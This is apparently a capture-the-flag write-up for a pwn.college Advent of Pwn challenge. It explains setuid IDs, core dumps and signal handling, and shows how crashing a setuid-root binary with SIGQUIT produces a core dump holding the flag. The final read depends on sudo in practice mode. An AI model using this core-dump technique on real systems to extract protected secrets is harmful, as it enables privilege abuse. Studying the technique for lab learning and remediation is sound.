# Pwn College Advent of Pwn Day 2

## Context

We are provided with a description of the challenge, a file claus.c, a claus executable, and a shell script init-coal.sh. The challenge description is below:

```
CLAUS(7)                   Linux Programmer's Manual                   CLAUS(7)

NAME
       claus - unstoppable holiday daemon

DESCRIPTION
       Executes once per annum.
       Blocks SIGTSTP to ensure uninterrupted delivery.
       May dump coal if forced to quit (see BUGS).

BUGS       
       Under some configurations, quitting may result in coal being dumped into
       your stocking.

SEE ALSO
       nice(1), core(5), elf(5), pty(7), signal(7)

Linux                              Dec 2025                            CLAUS(7)
```

## Background Information: RUID, EUID, SUID, and permission bits

Recall that you can examine a file's or program's permissions, alongside other information, with `ls -l`:

```
ubuntu@2025~day-02:/challenge$ ls -l claus
-rwsr-xr-x 1 root root 16752 Dec  1 23:43 claus
```

The claus program has user permissions of "rws": read, write, and SetUID. When this SetUID bit is enabled, the user may execute the file with its owner's priveleges. As we can see from the third word in the line, the owner of the program is root. Thus, when a user executes the claus program, it will run as root.

Similarly to a file or program's permissions, a process has identifiers that allow the kernel to determine what priveleges actions it can perform. A process has 3 ID's:
1. RUID (real user ID): The ID of the owner of the process (ie, "Who started this process?")
2. EUID (effective user ID): Who's permissions the process currently has (ie, "Who is this process currently acting as?")
3. SUID (saved user ID): Stores the original EUID before any changes were made (ie, "Who was this process previously running as?")

Let's use an example. Imagine you log into some shell session as a regular user, and say your user ID is 2500. The RUID, EUID, and SUID of the process of the shell session are all 2500. You, as the user, started the process, the process is running as you, and the SUID is set to 2500 in case the EUID changes at some point in the future. 

Now, imagine you run the claus program. The process running the claus program will have an RUID of 2500 since you ran the program, and its EUID and SUID will both be 0 (root) due to the program's SetUID bit which allows it to run as root.

## Background Information: Program core dumps

When a program crashes for whatever reason, a core dump file will be created. Without going into details, this file essentially contains a snapshot of the program's memory just before it was dumped. That means that we can get valuable information, like what value a certain variable had, just before the program crashed. The usual way to examine how the program looked before crashing is to run the executable and the core dump with gdb. However, if you just want to get some string data, you may also run strings on the core dump with sudo priveleges. 

## Background Information: Signals, signal handling, and SIGTSTP, SIGINT, and SIGQUIT

A process can recieve a variety of signals, and a process can decide how to handle these signals through a signal handler, such as seen in the claus program:

```
void sigtstp_handler(int signum)
{
    puts("🎅 Santa won't stop!");
}

...

main () {
...
       if (signal(SIGTSTP, sigtstp_handler) == SIG_ERR) {
               perror("signal");
               return 1;
       }
...
}
```

Three of the more commonly handled signals are SIGTSTP (ctrl+Z), SIGINT (ctrl+C), and SIGQUIT (ctrl+\\). 

## Vulnerability

Let's take a closer look at the files we're given and identify the vulnerability at hand. 

Running ls -alF, we see that .init is a symlink to the init-coal.sh shell script:

```
ubuntu@2025~day-02:/challenge$ ls -alF
total 44
drwxr-xr-x 1 root root  4096 Jan  3 21:44 ./
drwxr-xr-x 1 root root  4096 Jan  3 21:44 ../
lrwxrwxrwx 1 root root    14 Dec  2 00:41 .init -> ./init-coal.sh*
-rwsr-xr-x 1 root root   676 Dec  1 23:54 DESCRIPTION.md*
-rwsr-xr-x 1 root root 16752 Dec  1 23:43 claus*
-rwsr-xr-x 1 root root  1848 Dec  1 23:43 claus.c*
-rwsr-xr-x 1 root root   122 Dec  1 23:49 init-coal.sh*
```

init-coal.sh essentially places a program's core dump it in the current directory and names it "coal". We can assume that the challenge setup runs this .init for us. 

```
ubuntu@2025~day-02:/challenge$ cat init-coal.sh 
#!/bin/sh

set -eu

mount -o remount,rw /proc/sys
echo coal > /proc/sys/kernel/core_pattern
mount -o remount,ro /proc/sys
```

An annotated version of claus.c is available alongside this writeup. The program essentially ensures its RUID, EUID, and SUID are all 0 (root), reads the flag, then "wraps" the flag by replacing characters with the # character. The new flag (with replaced # characters) is printed.

Note that the flag is only readable by the root:

```
-r--------   1 root root   61 Jan  3 21:44 flag
```

So, we need to get the flag before it is "wrapped", meaning just before it is overwritten by # characters during execution. If we intentionally crash the program, we may be able to examine that core dump to see the flag. We cannot stop the program with ctrl+Z (SIGTSTP), but we could use another signal like SIGQUIT (ctrl+\\).

## Exploitation

We may run the program, and immediatley as it begins, we may send a SIGQUIT signal (ctrl+\\) to crash the program.

```
ubuntu@2025~day-02:~$ ls
ubuntu@2025~day-02:~$ /challenge/claus
🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!
On, Comet! on Cupid! on, Donder and Blitzen!

^\Quit
ubuntu@2025~day-02:~$ ls
ubuntu@2025~day-02:~$
```

As we can see, there is no core output, so may need to increase the possible size of core dumps. Let's run ulimit -c to check the maximum size of core dumps:

```
ubuntu@2025~day-02:~$ ulimit -c
0
ubuntu@2025~day-02:~$
```

The size is set to 0, so we need to increase it. We can can increase it unlimited and try the exploit again:

```
ubuntu@2025~day-02:~$ ulimit -c unlimited
ubuntu@2025~day-02:~$ ulimit -c
unlimited
ubuntu@2025~day-02:~$ ls
ubuntu@2025~day-02:~$ /challenge/claus
🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!
On, Comet! on Cupid! on, Donder and Blitzen!

^\Quit (core dumped)
ubuntu@2025~day-02:~$ ls
coal
ubuntu@2025~day-02:~$
```

Since we just need to find the flag string, we can run strings on the core dump file, but this can only be done with elevated priveleges.

```
ubuntu@2025~day-02:~$ strings coal
strings: coal: Permission denied
ubuntu@2025~day-02:~$ ls -l
total 108
-rw------- 1 root ubuntu 425984 Jan  4 00:08 coal
ubuntu@2025~day-02:~$
```

Luckily, pwn college offers running a challenge with privileges. We may switch to this mode and run the command with sudo.

```
ubuntu@practice~2025~day-02:~$ ls
coal
ubuntu@practice~2025~day-02:~$ sudo strings coal | grep college
pwn.college{ < flag redacted :) >}
ubuntu@practice~2025~day-02:~$
```

## Remediation

There are a couple of ways to remediate this vulnerability. One is to properly handle other signals that would be able to stop the program, like SIGQUIT. Another option is to not let users gain privileged access to analyze a core dump by running strings. Core dumps can also be disabled.

# Sources/Credits

Written by Madalina Stoicov

